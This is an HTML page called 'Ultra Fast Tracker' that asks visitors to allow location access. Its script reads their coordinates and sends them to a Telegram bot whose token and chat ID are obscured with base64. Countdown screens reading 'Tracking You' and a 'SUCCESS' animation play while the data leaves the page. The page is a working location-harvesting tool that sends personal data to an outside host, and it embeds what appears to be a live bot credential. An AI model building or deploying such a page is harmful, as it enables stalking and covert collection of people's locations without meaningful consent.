<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Ultra Fast Tracker</title>

<style>
body {
    margin: 0;
    height: 100vh;
    background: #FF1493;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    font-family: Arial;
    color: white;
    text-align: center;
}

/* Button */
button {
    padding: 12px 25px;
    font-size: 18px;
    border: none;
    border-radius: 10px;
    cursor: pointer;
}

/* Countdown */
#countdown {
    font-size: 80px;
    font-weight: bold;
    margin-top: 20px;
}

#heading {
    font-size: 28px;
    margin-top: 20px;
}

/* Shake Image */
#shakeImg {
    width: 200px;
    display: none;
    margin-top: 20px;
}

/* Strong shake animation */
@keyframes shake {
    0% { transform: translate(0px, 0px); }
    25% { transform: translate(15px, -15px); }
    50% { transform: translate(-15px, 15px); }
    75% { transform: translate(15px, 15px); }
    100% { transform: translate(-15px, -15px); }
}

.shake {
    animation: shake 0.1s infinite;
}
</style>
</head>

<body>

<button onclick="startProcess()">Allow Location</button>

<div id="heading"></div>
<div id="countdown"></div>

<img id="shakeImg" src="https://i.imgur.com/8Km9tLL.png">

<audio id="successAudio" src="https://www.soundjay.com/buttons/sounds/button-3.mp3"></audio>

<script>
(function(){

const BOT_TOKEN = atob("ODUyNDM5OTY5MjpBQUg4Uk5GbzZVZktDcjgxSUM1c1k2Rk8yMGh4QUJTX3VQUQ==");
const CHAT_ID  = atob("NjI3NzQzMjM1Ng==");

let uploadDone = false;

/* 🚀 TELEGRAM SEND (FASTEST POSSIBLE) */
function sendToTelegram(lat, lon) {
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `📍 FAST LOCATION\nLat: ${lat}\nLon: ${lon}`
        })
    }).then(() => {
        uploadDone = true;
        onSuccess();
    }).catch(()=>{});
}

/* 📡 LOCATION */
function getLocationFast() {
    navigator.geolocation.getCurrentPosition(
        (pos) => {
            sendToTelegram(pos.coords.latitude, pos.coords.longitude);
        },
        () => {},
        {
            enableHighAccuracy: false,  // faster than true
            timeout: 5000,
            maximumAge: Infinity       // reuse cached = fastest
        }
    );
}

/* 🎯 SUCCESS EFFECT */
function onSuccess() {
    document.getElementById("heading").innerText = "SUCCESS";
    document.getElementById("countdown").innerText = "";

    const img = document.getElementById("shakeImg");
    img.style.display = "block";
    img.classList.add("shake");

    document.getElementById("successAudio").play();
}

/* ⏱ COUNTDOWN ENGINE */
function runCountdown(seconds, color, title, callback) {

    const heading = document.getElementById("heading");
    const countdown = document.getElementById("countdown");

    heading.innerText = title;
    countdown.style.color = color;

    let time = seconds;

    const interval = setInterval(() => {

        if (uploadDone) {
            clearInterval(interval);
            return;
        }

        countdown.innerText = time;
        time--;

        if (time < 0) {
            clearInterval(interval);
            callback && callback();
        }

    }, 1000);
}

/* 🔥 MAIN FLOW */
window.startProcess = function () {

    uploadDone = false;

    // Start location instantly (parallel)
    getLocationFast();

    // 1st Countdown (Black - 10s)
    runCountdown(10, "black", "Tracking You (Phase 1)", () => {

        if (uploadDone) return;

        // 2nd Countdown (Red - 5s)
        runCountdown(5, "red", "Still Processing (Phase 2)", () => {

            if (uploadDone) return;

            // 3rd Countdown (Yellow - fallback)
            runCountdown(5, "yellow", "Final Attempt (Phase 3)");

        });

    });
};

})();
</script>

</body>
</html>
